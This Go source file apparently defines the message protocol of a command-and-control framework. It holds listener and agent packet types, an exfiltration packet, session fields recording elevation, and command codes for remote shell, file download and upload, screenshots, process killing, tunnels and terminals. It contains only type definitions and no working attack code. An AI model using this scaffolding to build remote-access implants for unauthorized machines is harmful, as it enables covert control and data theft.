package utils

import (
	"context"
	"net"
)

type Connection struct {
	PackType     int
	Conn         net.Conn
	Ctx          context.Context
	HandleCancel context.CancelFunc
	JobCancel    context.CancelFunc
}

/// Listener

const (
	INIT_PACK    = 1
	EXFIL_PACK   = 2
	JOB_PACK     = 3
	JOB_TUNNEL   = 4
	JOB_TERMINAL = 5
)

type StartMsg struct {
	Type int    `msgpack:"id"`
	Data []byte `msgpack:"data"`
}

type InitPack struct {
	Id   uint   `msgpack:"id"`
	Type uint   `msgpack:"type"`
	Data []byte `msgpack:"data"`
}

type ExfilPack struct {
	Id   uint   `msgpack:"id"`
	Type uint   `msgpack:"type"`
	Task string `msgpack:"task"`
}

type JobPack struct {
	Id   uint   `msgpack:"id"`
	Type uint   `msgpack:"type"`
	Task string `msgpack:"task"`
}

type TunnelPack struct {
	Id        uint   `msgpack:"id"`
	Type      uint   `msgpack:"type"`
	ChannelId int    `msgpack:"channel_id"`
	Key       []byte `msgpack:"key"`
	Iv        []byte `msgpack:"iv"`
	Alive     bool   `msgpack:"alive"`
}

type TermPack struct {
	Id     uint   `msgpack:"id"`
	TermId int    `msgpack:"term_id"`
	Key    []byte `msgpack:"key"`
	Iv     []byte `msgpack:"iv"`
	Alive  bool   `msgpack:"alive"`
	Status string `msgpack:"status"`
}

/// Agent

type Profile struct {
	Type        uint     `msgpack:"type"`
	Addresses   []string `msgpack:"addresses"`
	BannerSize  int      `msgpack:"banner_size"`
	ConnTimeout int      `msgpack:"conn_timeout"`
	ConnCount   int      `msgpack:"conn_count"`
	UseSSL      bool     `msgpack:"use_ssl"`
	SslCert     []byte   `msgpack:"ssl_cert"`
	SslKey      []byte   `msgpack:"ssl_key"`
	CaCert      []byte   `msgpack:"ca_cert"`
}

type SessionInfo struct {
	Process    string `msgpack:"process"`
	PID        int    `msgpack:"pid"`
	User       string `msgpack:"user"`
	Host       string `msgpack:"host"`
	Ipaddr     string `msgpack:"ipaddr"`
	Elevated   bool   `msgpack:"elevated"`
	Acp        uint32 `msgpack:"acp"`
	Oem        uint32 `msgpack:"oem"`
	Os         string `msgpack:"os"`
	OSVersion  string `msgpack:"os_version"`
	EncryptKey []byte `msgpack:"encrypt_key"`
}

/// Types

type Message struct {
	Type   int8     `msgpack:"type"`
	Object [][]byte `msgpack:"object"`
}

type Command struct {
	Code uint   `msgpack:"code"`
	Id   uint   `msgpack:"id"`
	Data []byte `msgpack:"data"`
}

type Job struct {
	CommandId uint   `msgpack:"command_id"`
	JobId     string `msgpack:"job_id"`
	Data      []byte `msgpack:"data"`
}

type AnsError struct {
	Error string `msgpack:"error"`
}

type AnsPwd struct {
	Path string `msgpack:"path"`
}

type ParamsCd struct {
	Path string `msgpack:"path"`
}

type ParamsShell struct {
	Program string   `msgpack:"program"`
	Args    []string `msgpack:"args"`
}

type AnsShell struct {
	Output string `msgpack:"output"`
}

type ParamsDownload struct {
	Task string `msgpack:"task"`
	Path string `msgpack:"path"`
}

type AnsDownload struct {
	FileId   int    `msgpack:"id"`
	Path     string `msgpack:"path"`
	Size     int    `msgpack:"size"`
	Content  []byte `msgpack:"content"`
	Start    bool   `msgpack:"start"`
	Finish   bool   `msgpack:"finish"`
	Canceled bool   `msgpack:"canceled"`
}

type ParamsUpload struct {
	Path    string `msgpack:"path"`
	Content []byte `msgpack:"content"`
	Finish  bool   `msgpack:"finish"`
}

type AnsUpload struct {
	Path string `msgpack:"path"`
}

type ParamsCat struct {
	Path string `msgpack:"path"`
}

type AnsCat struct {
	Path    string `msgpack:"path"`
	Content []byte `msgpack:"content"`
}

type ParamsCp struct {
	Src string `msgpack:"src"`
	Dst string `msgpack:"dst"`
}

type ParamsMv struct {
	Src string `msgpack:"src"`
	Dst string `msgpack:"dst"`
}

type ParamsMkdir struct {
	Path string `msgpack:"path"`
}

type ParamsRm struct {
	Path string `msgpack:"path"`
}

type ParamsLs struct {
	Path string `msgpack:"path"`
}

type FileInfo struct {
	Mode     string `msgpack:"mode"`
	Nlink    int    `msgpack:"nlink"`
	User     string `msgpack:"user"`
	Group    string `msgpack:"group"`
	Size     int64  `msgpack:"size"`
	Date     string `msgpack:"date"`
	Filename string `msgpack:"filename"`
	IsDir    bool   `msgpack:"is_dir"`
}

type AnsLs struct {
	Result bool   `msgpack:"result"`
	Status string `msgpack:"status"`
	Path   string `msgpack:"path"`
	Files  []byte `msgpack:"files"`
}

type PsInfo struct {
	Pid     int    `msgpack:"pid"`
	Ppid    int    `msgpack:"ppid"`
	Tty     string `msgpack:"tty"`
	Context string `msgpack:"context"`
	Process string `msgpack:"process"`
}

type AnsPs struct {
	Result    bool   `msgpack:"result"`
	Status    string `msgpack:"status"`
	Processes []byte `msgpack:"processes"`
}

type ParamsKill struct {
	Pid int `msgpack:"pid"`
}

type ParamsZip struct {
	Src string `msgpack:"src"`
	Dst string `msgpack:"dst"`
}

type AnsZip struct {
	Path string `msgpack:"path"`
}

type AnsScreenshots struct {
	Screens [][]byte `msgpack:"screens"`
}

type ParamsRun struct {
	Program string   `msgpack:"program"`
	Args    []string `msgpack:"args"`
	Task    string   `msgpack:"task"`
}

type AnsRun struct {
	Stdout string `msgpack:"stdout"`
	Stderr string `msgpack:"stderr"`
	Pid    int    `msgpack:"pid"`
	Start  bool   `msgpack:"start"`
	Finish bool   `msgpack:"finish"`
}

type JobInfo struct {
	JobId   string `msgpack:"job_id"`
	JobType int    `msgpack:"job_type"`
}

type AnsJobList struct {
	List []byte `msgpack:"list"`
}

type ParamsJobKill struct {
	Id string `msgpack:"id"`
}

type ParamsTunnelStart struct {
	Proto     string `msgpack:"proto"`
	ChannelId int    `msgpack:"channel_id"`
	Address   string `msgpack:"address"`
}

type ParamsTunnelStop struct {
	ChannelId int `msgpack:"channel_id"`
}

type ParamsTerminalStart struct {
	TermId  int    `msgpack:"term_id"`
	Program string `msgpack:"program"`
	Height  int    `msgpack:"height"`
	Width   int    `msgpack:"width"`
}

type ParamsTerminalStop struct {
	TermId int `msgpack:"term_id"`
}

const (
	COMMAND_ERROR      = 0
	COMMAND_PWD        = 1
	COMMAND_CD         = 2
	COMMAND_SHELL      = 3
	COMMAND_EXIT       = 4
	COMMAND_DOWNLOAD   = 5
	COMMAND_UPLOAD     = 6
	COMMAND_CAT        = 7
	COMMAND_CP         = 8
	COMMAND_MV         = 9
	COMMAND_MKDIR      = 10
	COMMAND_RM         = 11
	COMMAND_LS         = 12
	COMMAND_PS         = 13
	COMMAND_KILL       = 14
	COMMAND_ZIP        = 15
	COMMAND_SCREENSHOT = 16
	COMMAND_RUN        = 17
	COMMAND_JOB_LIST   = 18
	COMMAND_JOB_KILL   = 19

	COMMAND_TUNNEL_START = 31
	COMMAND_TUNNEL_STOP  = 32

	COMMAND_TERMINAL_START = 35
	COMMAND_TERMINAL_STOP  = 36
)
